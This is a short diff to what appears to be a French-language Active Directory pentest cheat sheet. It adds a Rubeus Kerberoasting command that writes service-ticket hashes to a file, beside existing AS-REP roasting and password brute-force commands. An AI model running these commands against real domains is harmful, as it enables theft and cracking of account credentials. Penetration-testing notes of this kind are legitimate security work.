@@ -265,6 +265,7 @@ Protocoles à tester : SMB, WINRM, RDP, MSSQL, FTP, LDAP, SSH
 
     ./Rubeus.exe asreproast /nowrap
     ./Rubeus.exe brute /password:Mdp123 /noticket
+    ./Rubeus.exe kerberoast /outfile:hashes.kerberoast
     
 **Pass the Hash** 
 
